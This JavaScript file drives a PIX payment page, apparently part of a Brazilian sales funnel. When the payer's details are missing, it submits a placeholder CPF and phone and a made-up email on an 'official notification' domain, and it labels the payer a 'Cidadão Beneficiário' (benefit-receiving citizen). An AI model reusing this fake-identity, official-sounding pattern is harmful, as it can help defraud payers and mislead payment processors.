/**
 * Integração Frontend com API PIX Pepper (PHP Puro)
 * Comunicação 100% segura sem chaves ou tokens expostos no frontend.
 * Sem dependência de banco de dados.
 */

var pollingInterval = null;
var countdownTimer = null;
var currentPixHash = null;

// Determina dinamicamente a URL base da API
function getApiUrl(endpoint) {
  var path = window.location.pathname;
  if (path.indexOf('/build-single-html') !== -1) {
    var prefix = path.substring(0, path.indexOf('/build-single-html') + '/build-single-html'.length);
    return prefix + '/api/' + endpoint;
  }
  var idxAcesso = path.indexOf('/acesso/');
  if (idxAcesso !== -1) {
    return path.substring(0, idxAcesso) + '/api/' + endpoint;
  }
  var lastSlash = path.lastIndexOf('/');
  if (lastSlash > 0) {
    return path.substring(0, lastSlash) + '/api/' + endpoint;
  }
  return '/api/' + endpoint;
}

// Obtém parâmetros da URL atual
function getUrlParams() {
  var params = {};
  var search = window.location.search.substring(1);
  if (!search) return params;
  var pairs = search.split('&');
  for (var i = 0; i < pairs.length; i++) {
    var pair = pairs[i].split('=');
    if (pair.length === 2) {
      params[decodeURIComponent(pair[0])] = decodeURIComponent(pair[1].replace(/\+/g, ' '));
    }
  }
  return params;
}

// Obtém dados do cliente coletados no funil
function getCustomerData() {
  var params = getUrlParams();
  var stored = {};
  try {
    var raw = localStorage.getItem('leadData') || sessionStorage.getItem('leadData');
    if (raw) stored = JSON.parse(raw);
  } catch (e) {}

  var name = stored.nome || stored.name || params.nome || params.name || 'Cidadão Beneficiário';
  var cpf = stored.cpf || stored.document || params.cpf || '12345678909';
  var email = stored.email || params.email || ('contato.' + cpf.replace(/\D/g, '').substring(0, 5) + '@notificacao-oficial.com');
  var phone = stored.telefone || stored.phone || params.telefone || params.phone || '11987654321';

  return {
    name: name,
    cpf: cpf,
    email: email,
    phone: phone,
    utm_source: params.utm_source || '',
    utm_medium: params.utm_medium || '',
    utm_campaign: params.utm_campaign || '',
    utm_content: params.utm_content || '',
    utm_term: params.utm_term || '',
    src: params.src || '',
    sck: params.sck || ''
  };
}

// Criação ou recuperação de Transação PIX na Pepper via PHP
function createTransaction() {
  var payBtn = document.getElementById('paymentButton');
  var loadingMsg = document.getElementById('loadingMessage');
  var pixContainer = document.getElementById('pixCodeContainer');

  if (payBtn) payBtn.style.display = 'none';
  if (loadingMsg) {
    loadingMsg.style.display = 'block';
    loadingMsg.textContent = 'Gerando código PIX seguro junto à Pepper...';
  }

  var customer = getCustomerData();

  fetch(getApiUrl('gerar-pix.php'), {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Accept': 'application/json'
    },
    body: JSON.stringify(customer)
  })
  .then(function(res) {
    return res.json().then(function(data) {
      return { ok: res.ok, status: res.status, data: data };
    });
  })
  .then(function(result) {
    if (loadingMsg) loadingMsg.style.display = 'none';

    if (!result.ok || !result.data || !result.data.success) {
      var err = (result.data && result.data.error) ? result.data.error : 'Erro ao gerar o PIX.';
      alert(err);
      if (payBtn) payBtn.style.display = 'block';
      return;
    }

    var data = result.data;
    currentPixHash = data.hash;

    // Atualiza campo Copia e Cola
    var pixInput = document.getElementById('pixCode');
    if (pixInput && data.pix && data.pix.pix_qr_code) {
      pixInput.value = data.pix.pix_qr_code;
    }

    // Atualiza imagem do QR Code
    var qrImg = document.getElementById('pixQrCodeImg');
    if (qrImg && data.pix) {
      if (data.pix.qr_code_base64) {
        qrImg.src = data.pix.qr_code_base64;
      } else if (data.pix.pix_url) {
        qrImg.src = data.pix.pix_url;
      }
    }

    // Exibe o container com as informações do PIX
    if (pixContainer) {
      pixContainer.style.display = 'block';
      pixContainer.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
    }

    // Inicia cronômetro e consulta periódica
    startCountdown();
    startPollingPayment();
  })
  .catch(function(err) {
    console.error('Erro de conexão ao gerar PIX:', err);
    if (loadingMsg) loadingMsg.style.display = 'none';
    if (payBtn) payBtn.style.display = 'block';
    alert('Erro de comunicação com o servidor de pagamento. Tente novamente.');
  });
}

// Consulta periódica do status do pagamento na Pepper (5 a 7 segundos)
function startPollingPayment() {
  if (pollingInterval) clearInterval(pollingInterval);

  var pollCount = 0;
  var maxPolls = 120; // Aproximadamente 10 a 12 minutos de checagem

  pollingInterval = setInterval(function() {
    pollCount++;
    if (pollCount > maxPolls) {
      clearInterval(pollingInterval);
      return;
    }

    fetch(getApiUrl('consultar-pix.php'), {
      method: 'GET',
      headers: {
        'Accept': 'application/json'
      }
    })
    .then(function(res) { return res.json(); })
    .then(function(data) {
      if (!data) return;

      // Status oficiais da Pepper: paid, waiting_payment, etc.
      if (data.is_paid === true || data.payment_status === 'paid') {
        onPaymentApproved();
      } else if (data.payment_status === 'cancelled' || data.payment_status === 'refused') {
        clearInterval(pollingInterval);
        var statusText = document.getElementById('pixStatusText');
        if (statusText) statusText.textContent = 'Cobrança expirada ou cancelada.';
      }
    })
    .catch(function(err) {
      console.warn('Falha pontual na verificação de status:', err);
    });
  }, 5000);
}

// Ação executada quando a Pepper confirma o pagamento (paid)
function onPaymentApproved() {
  if (pollingInterval) clearInterval(pollingInterval);
  if (countdownTimer) clearInterval(countdownTimer);

  var statusBadge = document.querySelector('.pix-status-badge');
  var statusText = document.getElementById('pixStatusText');
  var qrWrapper = document.querySelector('.pix-qrcode-wrapper');
  var copySection = document.querySelector('.pix-copy-section');
  var timerBox = document.querySelector('.pix-timer-box');
  var successBox = document.getElementById('pixPaidSuccess');

  if (statusBadge) statusBadge.style.backgroundColor = '#dcfce7';
  if (statusBadge) statusBadge.style.borderColor = '#86efac';
  if (statusBadge) statusBadge.style.color = '#15803d';
  if (statusText) statusText.textContent = '✓ Pagamento Aprovado na Pepper!';

  if (qrWrapper) qrWrapper.style.display = 'none';
  if (copySection) copySection.style.display = 'none';
  if (timerBox) timerBox.style.display = 'none';
  if (successBox) successBox.style.display = 'block';

  // Redireciona para o próximo passo do funil após 2.5 segundos
  setTimeout(function() {
    var search = window.location.search || '';
    if (window.AppFunil && window.AppFunil.goTo) {
      window.AppFunil.goTo('acesso-02');
      return;
    }
    if (window.parent && window.parent !== window && window.parent.navigateScreen) {
      window.parent.navigateScreen('acesso-02');
      return;
    }
    if (window.navigateScreen) {
      window.navigateScreen('acesso-02');
      return;
    }
    window.location.href = '../02' + search;
  }, 2500);
}

// Botão Copiar Código PIX
function copyPixCode() {
  var pixCodeInput = document.getElementById('pixCode');
  var copyButton = document.querySelector('.copy-btn');
  if (!pixCodeInput) return;

  pixCodeInput.select();
  pixCodeInput.setSelectionRange(0, 99999);

  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(pixCodeInput.value).then(function() {
      showCopiedFeedback(copyButton);
    }).catch(function() {
      document.execCommand('copy');
      showCopiedFeedback(copyButton);
    });
  } else {
    document.execCommand('copy');
    showCopiedFeedback(copyButton);
  }
}

function showCopiedFeedback(btn) {
  if (!btn) return;
  var originalHtml = btn.innerHTML;
  btn.innerHTML = '✓ CÓDIGO COPIADO COM SUCESSO!';
  btn.style.backgroundColor = '#16a34a';
  setTimeout(function() {
    btn.innerHTML = originalHtml;
    btn.style.backgroundColor = '';
  }, 2500);
}

// Cronômetro regressivo de 10 minutos
function startCountdown() {
  if (countdownTimer) clearInterval(countdownTimer);
  var timeLeft = 10 * 60; // 10 minutos
  var timerDisplay = document.getElementById('timer');

  countdownTimer = setInterval(function() {
    var minutes = Math.floor(timeLeft / 60);
    var seconds = timeLeft % 60;

    if (timerDisplay) {
      timerDisplay.textContent = (minutes < 10 ? '0' : '') + minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
    }

    if (timeLeft <= 0) {
      clearInterval(countdownTimer);
      if (timerDisplay) timerDisplay.textContent = '00:00';
    } else {
      timeLeft--;
    }
  }, 1000);
}

// Verifica no carregamento se já há uma sessão ativa para restaurar o PIX sem nova cobrança
document.addEventListener('DOMContentLoaded', function() {
  fetch(getApiUrl('consultar-pix.php'), { method: 'GET' })
    .then(function(res) { return res.json(); })
    .then(function(data) {
      if (data && data.success && data.payment_status) {
        if (data.is_paid || data.payment_status === 'paid') {
          onPaymentApproved();
        } else if (data.payment_status === 'waiting_payment') {
          // Reutiliza sessão existente
          createTransaction();
        }
      }
    })
    .catch(function() {});
});
